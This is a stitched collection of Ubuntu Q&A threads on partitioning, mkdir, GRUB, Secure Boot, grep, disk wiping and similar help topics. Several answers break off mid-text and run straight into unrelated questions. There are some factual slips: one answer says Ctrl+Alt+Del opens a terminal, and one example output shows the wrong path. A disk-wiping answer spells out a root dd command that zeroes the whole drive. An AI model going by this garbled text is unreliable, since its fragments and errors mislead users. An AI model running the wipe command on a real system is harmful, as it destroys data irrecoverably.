This means you've run into a big minefield: The Windows partitioning tools are terrible at handling extended and logical partitions on MBR disks. I've seen many posts from people whose disks have been seriously damaged by the Windows partitioning tools, usually because the Windows tools delete or otherwise damage logical partitions. In some cases, Windows converts a standard disk into one that uses the Microsoft-specific Logical Disk Manager (LDM) format. Because you've provided no partition table details, I can't be sure this is what's happened to you, but the odds are pretty good that it is. To be sure, please boot an Ubuntu live disk, run the following command, and post the results back here:\nsudo fdisk -l\n\nBe sure to post the results by editing your original question! Also, please add four spaces to the start of each line of the fdisk output; this flags it to preserve the formatting, which will become illegible if you don't do this.\nDepending on how bad the damage is, you might be able to correct it with my FixParts program, which is part of the gdisk package in Ubuntu; or you might need to use the TestDisk program. You might even need to resort to more advanced tools or recover everything from a backup.\n\nA: I tried repairing with boot rescue, but closed in the middle-way because I did not quite understand what it was trying to do. That I guess further worsened the grub and chances of booting into Ubuntu.\nAfter further consulting our system admin, I came to know that the partition disks have been converted to dynamic disks by microsoft windows. And once converted to dynamic disk, you cannot  change it back to primary partition. So ultimately had to recreate the partitions, format the PC & reinstall everything.\nThanks for all the help & support.\n", "Q: How to make a line of directories with one command? With the mkdir command if I want this location to exist ~/test/panda/fat when only the ~ part of it exists so far I have to do something like this:\nmkdir ~/test\nmkdir ~/test/panda\nmkdir ~/test/panda/fat\n\nThough it would be much more useful if I could just run something like mkdir ~/test/panda/fat and rather than just getting this error:\nmkdir: cannot create directory ‘/home/$USER/test/panda/fat’: No such file or directory\n\nActually have it create the directory test in ~, then the directory panda in ~/test, and then finally the directory fat in that sub-directory. Am I missing something? Is there a way of doing this as it would be very useful? What would in fact be even more useful in certain situations is for me also to be able to also automatically create a file at the end so that it would create all those directories and then the file bamboo.txt in fat and for all this to be in the same command (obviously not requiring there to be a file at the end though).\nIf there is not already a command which can do this (which I would be surprised if there isn't), then how can I make a script to make this so?\nI am running Ubuntu GNOME 15.10 with GNOME 3.18.\n\nA: Use the -p option of mkdir:\nmkdir -p ~/test/panda/fat\n\nFrom man mkdir:\n-p, --parents\n              no error if existing, make parent directories as needed\n\nExample:\n% mkdir /tmp/foo/bar\nmkdir: cannot create directory ‘/tmp/foo/bar’: No such file or directory\n\n% mkdir -p /tmp/foo/bar    ## Done\n\n\nNow about a file creation after automatically creating the non-existing directories in between, simply put- you can't do this in one go.\nAt most, you can add the file generation command after the directory generation one:\nmkdir -p ~/test/panda/fat && touch ~/test/panda/fat/bamboo.txt\n\nYou can use history expansion for touch command to make it shorter or create a shell function for convenience.\n\nHere is a shell function that will do the job: \ncreate_file_dir() {\n    [ \"$#\" -ne 2 ] && echo 'Insufficient Arguments' ||\n\n        case \"$1\" in -d)    mkdir -p \"$2\" && echo \"Directory '\"$2\"' Created\" ;;\n\n                     -f)    mkdir -p \"${2%/*}\" && touch \"$2\" \\\n                              && echo \"File '\"$2\"' Created\" ;;\n\n                      *)    echo \"Invalid Argument\"\n        esac\n}\n\nPut the snippet in your ~/.bashrc, do source ~/.bashrc and use it as:\ncreate_file_dir -d /directories/to/create  ##For only directories\ncreate_file_dir -f /path/to/file  ## For file with intermediate dirs\n\nCaveat: If a file already exists, touch will change the timestamp.  \nExample:\n$ create_file_dir -d /tmp/spam/egg/\nDirectory '/tmp/spam/egg/' Created\n\n$ create_file_dir -f /tmp/spam/egg/foobar\nFile '/tmp/foo/bar/foobar' Created\n\n$ create_file_dir /spam/egg\nInsufficient Arguments\n\n$ create_file_dir -m /spam/egg\nInvalid Argument\n\n\nA: Try using the -p argument to create the parent directories as needed.\n   -p, --parents\n          no error if existing, make parent directories as needed\n\n\nA: And if you don't want to use the -p option, you could type:\nmkdir  ~/test  ~/test/panda  ~/test/panda/fat\n\n", "Q: xdebug stack as links to netbeans I am trying to make the xdebug stack links to open files directly in netbeans, here is what I have done so far:\n\n*\n\n*I created an executable file /home/david/bin/netbeans.sh (which I chmoded +x) containing:\n#!/bin/bash\n\nurl=$2\nfile=${url#*\\/\\/}\nfile=${file%?line=*}\nline=${url#*line=}\n\n/home/david/Programs/netbeans-8.1/bin/netbeans --open $file:$line\n\n\n\n*in /etc/php5/apache2/php.ini I added\nxdebug.file_link_format = \"netbeans://%f?line:%l\"\n\n\n\n*in firebug \"about:config\" I created a new boolean:\nnetwork.protocol-handler.expose.netbeans => false\n\n\n\n*I created a new url-handler in Gnome's gconf:\ngconftool-2 -t string --set /desktop/gnome/url-handlers/netbeans/command \"/home/david/bin/netbeans.sh %s\"\ngconftool-2 -t bool --set /desktop/gnome/url-handlers/netbeans/enabled true\ngconftool-2 -t bool --set /desktop/gnome/url-handlers/netbeans/needs_terminal false\n\nnow when I get an error, the files of xdebug's stack are links of type netbeans:///var/www/html/path/to/file.php, all good.\nWhen I click on one of those links, I get the \"Launch Application\" window where I have to choose the application to open the file with: I select the executable I created in step 1, i.e.: /home/david/bin/netbeans.sh but I get an error message saying:\n\n/home/david/: does not exist, or is not a plain file\n\nAnd this is where I am stuck, I don't understand why I get this error and how to solve it.\nedit screenshot of gnome config\n\n\nA: Okay, so we found the solution for this problem.

I need to put a password on an app but I need the app to run at the user level (not Sudo or SU). Is there an easy way to do this?\n\nA: You could do that with a simple bash script and Zenity.

It edits the menu of admin or root and not the current user which is a little pointless\nThis sounds really convoluted for a minor problem, and I am sure there is a simpler way to do this. I am relatively new to this sort of thing. Let me know if there is an easier way to do this.\nThanks,\nKyle T.\n", "Q: How do I get grub's name for a given partition? (specifically grub2) I know that grub names my hard drives and partitions counting from zero, so /dev/sda might be (hd0,0) and /dev/sdb2 might be (hd1,2). Is it guaranteed that grub numbers the hard drives in the same order that Linux does, or even the partitions, for that matter? The documentation that I found(1) for this naming convention handwaves over this detail, and I can't find a way to actually determine what grub's name for a given partition will be.\nI was under the impression that it isn't even guaranteed that /dev/sda won't load as /dev/sdc when I reboot my PC, and that this is why we use UUID's in fstab instead of /dev/sd* labels. Is there a way to use a UUID or something similar in /etc/grub.d scripts, instead of the (hdX,Y) notation?\n(1) https://dev.gentoo.org/~floppym/grub.html#Naming-convention\n\nA: *\n\n*\"/dev/sda might be (hd0,0)\" : wrong. Disks are represented by a single number by GRUB. If GRUB is installed in /dev/sda, it will be (hd0).\n\n*Partitions are name with (hdX,Y), with X being the hard drive number and Y the partition number.\n\n*Disk numbers vary from case to case. If you chainloaded GRUB in another disk (say, a thumb drive), the thumb drive will be represented as (hd0) and your main disk as (hd1) (the opposite happens if you run GRUB from your main disk).\n\n*You can always list all the drives in GRUB using the ls command.\n\n*You can use UUIDs instead of the traditional (hdx,y) method with this command: search --no-floppy --fs-uuid --set XXXXXX (replacing XXXXXX with your partition's UUID.

In Ubuntu 16.04 the Ubuntu Software Center will be replaced with the GNOME Software app, but why is this so? Why did they make this decision? Because GNOME Software hasn't even been released stably yet... So why should they rush it in to replace the Ubuntu Software Center which has been going stably for such a long time? There must be a very important reason for this change otherwise it is just craziness... \n\nA: From OMG UBUNTU!\n\nThe decisions were taken at a recent desktop Sprint held at Canonical HQ in London.\n“We are more confident in our ability to add support for Snaps to\n  GNOME Software Centre (sic) than we are to Ubuntu Software Centre. And\n  so, right now, it looks like we will be replacing [the USC] with GNOME\n  Software Centre”, explains Ubuntu desktop manager Will Cooke at the\n  Ubuntu Online Summit.\n\nMore from PCWorld\n\nThis isn’t huge news if you’ve been keeping track of the increasing deterioration of the Ubuntu Software Center. This summer, I chronicled how Canonical was slowly letting the Ubuntu Software Center wither and die. The paid “app store” side of it was axed with no warning to developers. Ubuntu MATE 15.10 already dropped the Software Center for something better.\nThe Software Center was great when it was released, offering a more user-friendly “app store”-like interface for installing Linux software. But it has stagnated and is rather slow. Other applications—particularly GNOME’s Software app—have caught up. Ubuntu’s developers haven’t really been working much on the Ubuntu Software Center, after all. They’ve been working on the next-generation app store for Unity 8, which works on Ubuntu for phones and will eventually arrive on the desktop with the converged Unity 8 desktop.\n\nGNOME Software to the rescue\n\nIf you’ve ever used Fedora—or just seen screenshots of it—you’ve\n  probably seen GNOME’s Software application in action. Fedora, a fairly\n  GNOME-centric Linux distribution, was the first to adopt it.\nThis will give the traditional Unity 7 desktop on Ubuntu 16.04 LTS a\n  stable software center that other people are working on and\n  maintaining, freeing up development time. It’s also more modern, and\n  Ubuntu’s developers feel it would be easier to add support for those\n  new container-like Snappy packages to GNOME Software than to the old\n  Ubuntu Software Center\n\nHope it helps!\n", "Q: How can I increase the size of Root Partition? I have installed Ubuntu 14.04LTS along with Windows 10. I have dedicated 10GB for root directory and now I want to resize the root partition. How can I resize the root?\n\nA: If, during the Ubuntu installation, you selected a 10GB partition to be mounted as root (/) and another partition for (I'm assuming) /home, then you should be able to use Gparted to increase the size of the root partition. Install and open Gparted, find the 10GB partition, and see if there is any free space after it. If so, you can resize it. If not, I believe you can move the partition that is to the right of the root partition. (This is more risky than usual, so unless you actually need more space, don't do it.) Resize the last partition on the drive so that it's smaller.

When I installed my ubuntu, I only made partitions for ext4 and swap, but now i have 1.5 Tb of free space and I cant use it. What should I do?\n\nA: You should be able to use Gparted to resize your Ubuntu partition to fill up the free space.\nIf Gparted isn't installed, open a terminal (Ctrl+Alt+Del) and run sudo apt-get install gparted.\nOpen Gparted by searching for it in Dash (~Start Menu). Select your Ubuntu partition and move your cursor to the edge of it next to the free space. You should be able to drag that edge to fill up the free space of the hard drive. Click Apply in the top left to confirm the change.\nIf it happens that your swap partition comes between the Ubuntu partition and free space, you'll have to move some things around, which can take a very long time to do. Since it also increases the risk for loss of data, I won't explain this process unless you really want to try it out.\nInstead of moving partitions, I recommend just creating a new partition in the free space to act as a data drive. Select the free space in Gparted and click the button to create a new partition in that space. Apply it, and you should now have a ~1.5TB data partition.\nIf you have any questions, comment.\n", "Q: How to wipe disk clean totally I saw this has been answered before but related to windows.\nI have the following on a 2009 macbook air and would like to wipe the disk and start over:\nMinimal bash-like line editing is supported.\nFor the first word, TAB lists possible command completions.\nAnywhere else TAB lists possible device or file completions.\nGrub>\n\nI typed in exit and nothing occurred. Any direction please. I do not know what else is on this particular disk and to avoid complication I just want to wipe ALL and start over newly. Please advise. Thanks. Best, Richard\n\nA: I would install a fresh copy of Ubuntu, and that will wipe the disk in the process.  That should be a sufficient \"wipe\" unless you are trying to hide files from a forensic investigator.  Good luck!\n\nA: Wiping the disk is not necessary. Just boot using a LiveCD/LiveUSB and (re-)install Ubuntu. During installation, you can reformat the whole disk. That should be sufficient.\nIf you want to wipe the disk before reinstalling, you can write zeros across the complete disk using the LiveCD/LiveUSB, a terminal, and the dd command.\nEdit\nTo wipe a hdd, you need to boot a Live-Image of a Linux system, eg. Ubuntu. After booting into the system, you need to open a terminal. Root privileges are required to write on hardware level to a disk, therefore you need to become root. A root shell can easily be opened by \nsudo -i \nBefore you use the dd command, it is absolutely necessary to determine the correct location of your hdd. This can be done for example by gparted. This enables you to match the expected vs. found partitions and hdd size. Make sure, that you are using the correct location, otherwise you will destroy the data set!!! In the following I assume, that the hdd is located at /dev/sda.\nTo wipe the disk, you can use the command\ndd if=/dev/zero of=/dev/sda\nThat will write zeros on the entire disk, making it very unlikely that someone can recover the original data. Instead of /dev/zero you can use /dev/urandom to use (pseudo-)random data instead of zeros, but that will slow down the writing process dramatically! You will find often, that overwriting only one time is not sufficient to prevent recovering. I think and read that this is an urban legend (eg. here).\nHope that this description is detailed enough to wipe your disk. Last, let me put the warning here once more: Make sure, you are using the right disk location for the dd command, otherwise your data will be unrecoverable destroyed!!!*\n", "Q: USB mouse disconnecting and reconnecting randomly in 14.04 64bit Unfortunately I've been unable to identify the cause other than I have an application that runs, in what appears to be a Xorg scheduler (task manager shows worker, then a shed job), then the mouse stops.

I wanna install ubuntu on the 'C' partition without affecting the D partition. Can anyone explain in steps! Thanks :)\n\nA: You may consider:\n\n\n*\n\n*Use a virtual machine (VM). Options are: VMware Workstation Player (https://my.vmware.com/en/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/12_0), and VirtualBox (https://www.virtualbox.org/wiki/Downloads). Upon installation of one of those virtual machine software, you should be able to create a virtual machine, then create its virtual hard drive as a file on your C drive. If you are not satisfied with your virtual machine and want to delete it, you can safely delete the virtual machine's home folder on your physical hard drive.\n\n*For Windows 7 or lower, use \"wubi\" (See this for details: https://wiki.ubuntu.com/WubiGuide). This tool comes with an official Ubuntu installation image. You can run \"wubi\" in your Windows from the image. It creates a virtual hard drive which you can choose its location and size. It also adds an Ubuntu item into your Windows boot manager.\n\n*If you want to install an independent installation of Ubuntu - not recommended if you are new to Linux, you CANNOT install it in any existing Windows partitions (C:, D:, or whatever visible in Windows) because Linux and Windows should use different file systems by default to ensure normal operation (ext4 and NTFS respectively). In this way you have to shrink one of your current partitions, and create an ext4 partition for Ubuntu (probably a Linux swap partition too).\n\n", "Q: Ubuntu: \"Booting in insecure mode\" with SecureBoot enabled I have just installed Ubuntu 15.10, after having been with 16.04 LTS for some time to try it out. While I was using 16.04, I tried to install Nvidia Drivers and got told that I needed to disable SecureBoot for that, so I provided a password and on the next reboot some software asked for it. However, my BIOS settings still showed SecureBoot to be enabled, and I could still see how if I tried to boot from anything that wasn't signed, it would refuse to do so.\nHowever, when I reinstalled Ubuntu 15.10 (completely deleting everything related to 16.04, including grub in the EFI partition), every time I boot I get a Booting in insecure mode message.\nI have checked everything, and both: Windows and the BIOS setting report SecureBoot to be enabled\n\nA: If you want get rid of the message about Insecure Boot you need to enable secure boot.\nTo do this you need turn on validation in module MOK (Machine Owner Key):\nsudo mokutil --enable-validation\n\nYou will be asked to enter twice temporary password and than after reboot get a possibility to change validation state.\nIf validation is enabled than no more message about insecure boot appears.\nBut remember, you will not be able to run any unsigned drivers: nVidia drivers and VirtualBox will not be working.\nTo disable validation type:\nsudo mokutil --disable-validation\n\nand then reboot.\nIf you disable validation and have in BIOS Secure Boot switched ON, still you will not be able to boot anything that wasn't signed.\nEven though your ubuntu has validation disable but \"is seen\" by BIOS (UEFI) as signed because of shim-signed package. Shim package while your ubuntu is booting checks what is the MOK state and if validation is disabled shows message \"Booting in insecure mode\".\n\nA: You can check the status of Secure Boot by -\n$ mokutil --sb-state\n\nFor you, the output might be -\nSecureBoot enabled\nSecureBoot validation is disabled in shim\n\nYou need to use the following command to re-enable Secure Boot validation, which will eventually not show the text \"booting in insecure mode\".\n$ sudo mokutil --enable-validation\n\nHere, the command will ask you to enter a password.\nThis password is not your login password but just a temporary password. You need to set a password which will be asked in the following steps.\nNow, restart and follow the instruction shown on Perform MOK management blue screen. \nSelect Change Secure Boot state.\nSources - \nhttps://wiki.debian.org/SecureBoot \nhttps://wiki.ubuntu.com/UEFI/SecureBoot\n\nA: The first answer above includes this claim: 'If you want get rid of the message about Insecure Boot you need to enable secure boot.' That claim is false. Here is why (and the explanation might be of help to people who want rid of the message).\nSeeing the message 'booting in insecure mode' does not entail that secure boot is disabled in one's BIOS (a.k.a. in one's 'UEFI'). For, I have seen that message when secure boot was disabled at the BIOS level; what caused the message to show (or at least sufficed for its being shown) was the following. I had issued the command sudo mokutil --disable-validation and then rebooted and then gone through a mokutil (or should I say 'EFI'?) rigmarole. I had done that disabling in order to try to fix another problem to do with secure boot.\nThe command sudo mokutil --enable-validation sufficed to rid me of the 'booting in insecure mode' message. Thus I was returned to my previous happy state where secure boot was disabled and (yet) I did not see the message. Or rather that was the result when - again - I had rebooted (via that command) into the 'mokutil' interface and specifically, for one thing, told that interface to disable secure boot - or, rather, keep it disabled. That latter problem - namely, that one has to tell the interface generated by the mokutil command to disable something that is disabled already - is the tip of an iceberg. That iceberg is one of gratuitous unclarity that, rather shockingly, the mokutil-generated UI adds to the already perilous ocean of so-called secure boot. (Indeed, I may here be misunderstanding the interface at issue. If so, that only confirms my point.)\n", "Q: how do I get my hp 100 printer to work just installed ubuntu, and my hp100 Bluetooth printer is recognized, but it will not allow me to turn the connection on and print. any solutions would be very appreciated\n\nA: You can try HP Linux Printing and Imaging System (HPLIP)\nJust go to the software center and search hplip\n\nThe basic packages may already be installed, Make sure to scroll down and check the extras!\n", "Q: gnome-system-monitor error - Ubuntu 14.04 I have been intermittently getting this error when I try to run gnome-system-monitor in Ubuntu 14.04.

The only thing that works is logging out/logging back again into my Xubuntu session, and then trying to reconnect.\nI can't really give any technical details that would allow you to reproduce this bug. If you help me to diagnose it I can give more details, as requested.\nWhat can I do to solve this problem? Are similar bugs reported?\nIs there a better way to \"restart\" the session, without having to log off/on (maybe there is a service I can restart)?\n\nA: Old one but bug's still out there.\nAs a workaround, what I do is kill ssh processes linked with the lost server. When I relaunch Thunar, it's working again\nps -ef | grep ssh | grep server-name-or-ip\n\nThen\nkill -9 process'-id \n\n", "Q: Lubuntu frozen while installing I have this old PC hanging around so I decided to install Lubuntu on it just to give it some life and it freezes every time. I made a bootable USB, made two partitions (an ext4 and a swap partition) and whenever I reach the \"Who are you?\" page, where I input my name and password and click \"Continue\", the mouse freezes and I'm unable to do anything. I've tried it twice now, each time I had to remake the bootable USB because it wouldn't boot again.\nAny ideas?\nThe computer is pretty old but it has 1Gb of RAM, 256MB dedicated graphics and a 2,00Ghz Intel Pentium Processor. \n\nA: I've seen a lot of other people who have problems with Universal USB Installer.

Now I'm trying the live USB and I'm not sure how to continue. And I desperately don't want to damage my existing Windows 7 installation or my Linux profile.\nAt first I don't know which installation option I should select \n\nI've tried the option Something else but I'm stumped as to which partition I should select.

Here's my pastebin\n\nA: Make another usb stick with GParted Live on it. Boot from it and start the tool. Then choose to shrink sdb1 by about 30 GiB. You won't lose data this way.\nThen boot back into your live media and install the root partition as mentioned in the first answer.\nGParted has the ability to shrink partitions without destroying data, because it shoves it to the beginning of the partition.\nAnother method would be to just boot your live system and make a .tar.gz archive from your /home partition. Then make a fresh Ubuntu install and unpack your /home to /home.\n\nA: One way to recover yourself from that mess is by reinstalling Ubuntu, after having everything backed up along with the list of installed applications.\nHere's a step-by-step way to do that:\n\n\n*\n\n*Download Ubuntu. If you already have the *.iso then you may skip this step.\n\n*Next, burn the iso to your pendrive or a CD/DVD.\n\n\n*\n\n*To burn it to your pendrive you can use the following softwares:\n\n\n*\n\n*Rufus - If you are burning it in Windows environment.\n\n*Unetbootin - If you are burning it in Linux environment.\n\n\n*To burn it to your CD/DVD you can use the following softwares:\n\n\n*\n\n*K3B - If you are burning it in Linux environment.\n\n*Imgburn - If you are burning it in Windows environment.\n\n\n\n*Now, boot into the live environment of Ubuntu. An how-to to this step is too long and varies from system to system, so, I am skipping it for obvious reasons.\n\n*The first thing to do now, is to mount the partition, that contains your previous Ubuntu installation:\n\n\n*\n\n*To do that type:\nsudo mount /dev/sdaXY /mnt\n\nChange XY to your specification.\n\n*Also, mount the drive where you will make the backup to.\n\n\n*Next, copy all your data from /mnt/path/to/your/important_folders to /path/to/your/mounted_backup_drive\n\n\n*\n\n*If you have any problems in copying then try copying it using sudo. Later, you may change the permission of those folders.\n\n\n*Next, make a backup copy of your current installed softwares:\n\n\n*\n\n*Here, is a way on how to do that:\nfind /mnt/var/lib/dpkg/info/ -name \"*.list\"  -type f -printf \"%P\\n\" |  awk -F'.' '{print $1}' > /path/to/your/mounted_backup_drive/backup-list.txt\n\nEdit the relevant parts.\n\n\n*Next, make a backup of your current list of ppas. Here's how to do that.\n\n*Now, you can format your Ubuntu partition without any issue. After re-installation, restore your ppas and then, update and install all your previously installed packages from the aforementioned generated list.\n\nA: Using gparted, shrink /dev/sdb1 to 32GB. It's plenty of room for a typical root partition, it won't crowd your current situation and will leave ~110GB for /home.\nWhile re-partitioning is not risk-free, in 20 years and multiple dozens of re-partitionings, I have never had a problem.  Check out How to resize partitions? for pointers.\nCreate partition /dev/sdb3 from the remainder of the first partition.\nAn advantage of this method (separate partitions) is that if you wish to change distributions in the future, there is little drama.  It's almost like changing a shirt. All your personal data will be on another partition.  The new system can write the old root partition with glee.\nMount both partitions with either your GUI or with the command line using standard practices, such as discussed in  How to access a usb flash drive from the terminal?\nIf you are using the GUI, you may run into permission issues unless you use a super user (root) GUI.  The partitions would be mounted somewhere like /media/{LiveCD_user}/{UUID of dev-sdb1}/home/{old_user_id} and copy/move it to /media/LiveCD_user/{UUID of dev-sdb3/old_user_data.  The command line is less drama.\nFollow this procedure:\n\n*\n\n*Make two mount points:\nsudo mkdir /media/ubuntu_root  /media/new_home\n\nCall them what you will, the names are only for your benefit.\n\n\n*Mount the two new partitions in your system\nsudo mount /dev/sdb1 /media/ubuntu_root\nsudo mount /dev/sdb3 /media/new_home\n\n\n\n*Move your old home directory to the new partition\nsudo mv /media/ubuntu_root/home/{old_user_id} /media/new_home/old_user_data\n\n\n\n*Unmount the partitions after the data is moved to not be reminded during installation.\nsudo umount /dev/sdb1\nsudo umount /dev/sdb3\n\n\n\n*Launch the installer and install the new system with the *Something else option.\n\n\n*Select /dev/sb1 as root / and ☑tick  the format partition.\n\n\n*Select /dev/sdb3 as /home and do not format this partition (it has all your data).\n\n\n*You've installed a dual boot before, but be careful with GRUB.  Double check that regard.\n\n\n*Install. (Using the same user_id circumvents any unforeseen ownership issues).\n\n\n*When the dust has settled, boot into the new system, and drag the data you want from /home/old_user_data to the new location.\n\n\n*Delete the leftovers when you're done.\n\nA: It appears that your Ubuntu system was on sdb1.  For a something else install, click on sdb1 and click the Change button.  In the drop down box beside Use as: select ext4 and tick the box to format the partition.  In the drop down box beside Mount Point, select /.  Then click OK and Install Now.\n****** WARNING * This will blow away anything that remains on sdb1.*  So you will lose any data from your Ubuntu install that you did not back up.\n\nA: If you want to rescue the status of your system and not delete a thing you should try using the boot repair disk: Boot repair disk\nIt has helped me in so many situations like these, maybe it can restore your stuff.

It's just asking for permission to write onto the partition. It's not doing anything you dont want it to, provided you did not accidentally tick any formatting checkboxes, so always double check.) , and then backing up data/mounting that partition. This is the more straightforward and easier method, and it doesnt take much time to do.\n\n*If you dont like doing scary things to your HDD, how about doing it to a USB drive? You can make a Ubuntu-on-a-stick type of thing. Here are the instructions on how to do it. (You'll need 2 USB drives for this. One for LiveUSB and one for install. Install Drive should be atleast 8GB.)\n\n\n*\n\n*(I'm assuming you already have a LiveUSB and can boot into it, and have backed up important data from the 2nd USB Drive) First, boot into the LiveUSB. When it gives you the option to install, choose install. \n\n*Plug in the second USB drive, the drive which I called the 'install\ndrive' earlier. \n\n*Back to the installer, select all of the settings\nsuch as system locale, location, Time Standard and all that stuff.\n\n*When it asks you to select an installation type, Select 'Something\nElse' and then press Continue. It should take you to the partition\nmenu you saw before. \n\n*Now, instead of selecting any of those, Run\nGparted and look for your 2nd USB drive. If what I'm thinking is\nright, the LiveUSB should be named /dev/sdc/ and the 'install\ndrive' (the 2nd USB Drive) should be /dev/sdd/ but don't take my\nword for it, ALWAYS DOUBLE CHECK. One single mistake can wreck the\nwhole install. \n\n*After you have confirmed which mount point the 2nd drive, 'install drive' is in, called /dev/sdd/ from here on out, go back to the installer and make the /dev/sdd partition the / (root) partition, and select /dev/sdd/ to be the bootloader from the drop down menu at the bottom. \n\n*Double Check everything. \n\n*Click on 'Install Now'. It will ask for permission (those scary dialog boxes). Select 'Continue' on both of them. It will start installing. Let it install, do whatever you want while it installs. \n\n*After it has installed, shut down the LiveUSB, remove it from your PC, and boot from the 2nd USB drive, the 'install drive'. Voila! You have a portable persistence Ubuntu. You can carry it around, you can boot into any PC you want with it, and your files will be there. \n\n*We aren't done yet. To make it feel more like home, to make it more usable for you, we need to change some stuff in the fstab. First, Go into Gparted, and look for the HDD partitions that you have your stuff in, the partitions which you want to mount. Write them down somewhere, paper will do. \n\n*Go into a terminal, type sudo nano /etc/fstab and execute it. It should give you a editable text editor inside the terminal. It should have some scary numbers, but fear not. As long as you do what I tell you to do, you should have a working system by the end of this tutorial.\n\n*After the last line, Press enter and get into a new, clear, empty line. Type this code into it, filling in the space as required.\n<The drive location that you wrote onto paper a while ago> <The place you want it to open from, preferably somewhere in /mnt/> <ext4 or ntfs, the former for a linux partition, the latter for a windows one.> noatime,defaults 0 0 It should look something like this\n/dev/sdc1/ /mnt/Win7Stuff/ ntfs noatime,defaults 0 0 for a windows partition. After doing this for both the old Ubuntu Partition and the windows one, press CTRL+X and then press Y and then press enter twice.\n\n*Then type into the terminal sudo mkdir <whatever the /mnt/ directories you mounted them at, such as /mnt/Win7Stuff/. Do it for both the /mnt/ folders.\n\n*then type sudo mount -a into the terminal and press enter. And Voila! Your PC back~. You can backup everything you need.\n\n*Oh, also, I'd suggest adding the noatime to the / mount point as well, in /etc/fstab/ since it would increase the USB life. \n\n\n\nPlease do comment if you have any questions, and Im going to bed because its 6AM. Good night. Also, Please do tell me, why the heck did you give SWAP 30GIGS OF SPACE?!\n\nA: Problem fixed, based on advise received from user @hbdgaf in chat, by simply reinstalling and creating another account while doing so. After this I restored my old account. Still had to reinstall most applications though.\nPS: also had to fix inodes while reinstalling. So I guess that's what thwarted by earlier attempts to repair the installation.\n", "Q: what's wrong with my grep command? Grep works when I use is with ls | but when I try the command by itself, it just gives me a blinking cursor that never goes away on the next line (as if it's running a command).\nFor example, I tried:\nls | grep zip\n\nwhile in the bin directory and got a list of files, but plain grep zip in the same directory gives me the problem stated above.\n\nA: From man grep (emphasis mine):\ngrep  searches the named input FILEs (or standard input if no files are\nnamed, or if a single hyphen-minus (-) is given as file name) for lines\ncontaining  a  match to the given PATTERN.  By default, grep prints the\nmatching lines.\n\nIf you ran grep without a filename, or a pipe (the | in ls | grep):\ngrep foo\n\nThe standard input is the terminal - i.e., you. You have to provide the input which grep will search.\n$ grep foo\nthis is me typing stuff\nnow I'm typing foo, which will get printed again because grep matched foo     \nnow I'm typing foo, which will get printed again because grep matched foo\n\n\nA: grep takes a file or (files) as its input, when no file name is given grep reads from standard input (file descriptor 0).\nWhen you do ls | grep 'something', you are redirecting ls command's standard output to grep standard input via pipe (that's what | does). \nWhile in the later case when you just do grep 'something', there no file name given and hence grep will read its STDIN for input, no pipe is involved here so you need to type something on the STDIN (give input) to see the output.\nExample:\n% grep 46\n245\n480\n460\n460\n\nAs you can see grep matched 46 from my typed contents and showed it on STDOUT. BTW to close the interactive input session, press Ctrl + D which indicates EOF (End of File) (in this case read it as \"End of Input\").\n\nA: grep is not using for finding files in linux. You can use find command for searching files. grep command can be used to search text inside of the files. \nIf you want to find files named zip inside of the /bin directory use below find command\nfind /bin -name \"zip\"\ni used * infront of and ath the end, since the files there can be as gunzip, bzip, gzip. So to search everything matches zip word i used *. \nPlease read below two articles on how to use grep command and find command seperately.

Because my kern.log and syslog files were growing to immense size, I added the subject entry to a line in /etc/default/grub:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash reboot=efi,pci pci=nomsi,noaer\"\n\nBut I really don't understand what I did. Is there any downside to this?\n\nA: As stated here: http://redsymbol.net/linux-kernel-boot-parameters/2.6.28/\n\n\n*\n\n*noaer: [PCIE] If the PCIEAER kernel config parameter is enabled, this kernel boot option can be used to disable the use of PCIE advanced error reporting.\n\n*nomsi: [MSI] If the PCI_MSI kernel config parameter is enabled, this kernel boot option can be used to disable the use of MSI interrupts system-wide.\n\n\nA: I agree with you and your concern about adding the directive \"pci=nomsi,noaer\" in the grub directives to simply to suppress the reporting of errors. With serious problems, one needs to have the errors reported so we can fix them, something that won't happen with \"pci=nomsi,noaer\", a directive designed to suppress such valuable error messages.\nI happened to find this forum thread by searching for the \"no irq handler for vector\" message that appears too much when I boot into multi-user.target (text only based login). The error is extremely persistent making it difficult to type commands as it pops up in all ttys even while I am typing a command.\nAnswering your original question; will adding the directive \"pci=nomsi,noaer\" in grub harm your system? I would have to say \"no\", that the directive itself would cause any harm. HOWEVER, something is wrong with your system and suppressing the error message itself does nothing to fix the problem and, whatever the original problem is, IT MAY (actual problem indicated by an error message) cause harm to your system.\nConsider this; a man has a fever so you give him Tylenol and the fever goes away, but then he dies of a massive infection because we didn't give him the antibiotics he actually needed. Solving the error message won't help or harm your system, but ignoring the original problem, maybe!\nFor what its worth, I am still trying to figure out how to fix the problem that causes the error, \"no irq handler for vector\" that takes over my text based login. I know IRQs (Interrupt requests) are often used by hardware devices to get the attention of the CPU, and since I have been having problems with various hardware devices, the error is consistent with my hardware problems.\nI hope you find a solution to your problem.\n", "Q: Trying to install Java JDK from their SE Downloads page.

Or are their any alternatives to switch the java variables?\nThanks in advance\nCheers\n\nA: You can do it easily, just run it specifying the path of java you want to use.\nIn details:\nNormally java is installed under /usr/lib/jvm there where you can find the default java versions you have in your system.\nSo if you want to run another version other than the default one you should specify the full path of the Java.\nfor example suppose that java-version-8 as you specified above is under your Desktop so you can run any app using this version with the command:\n~/Desktop/java-version-8/java /path-to-your-application\n\nso you indicate what version to use.\nIf you want to do it GUI you can create a .desktop or edit an existing .desktop for the app to specify the path of the new-java instead of the default one.\nRead this and this to learn how to use .desktop files\n", "Q: Can not install pymol because I cannot install libfreetype6-dev I am following this link http://www.pymolwiki.org/index.php/User:Tlinnet/Linux_Install to install pymol.

Which option should I choose for installing the OS I tried using something else but couldn't understand the procedure. So, please help thanks.\n\nA: If you want to install Ubuntu taking up the whole disk, the procedure is even easier. \nInstall from CD-ROM or USB drive as usual, then when the installer ask about partitioning select the option \"Use the whole disk\". The installer will warn you that it has detected an existing OS; just ignore the warning and go ahead.

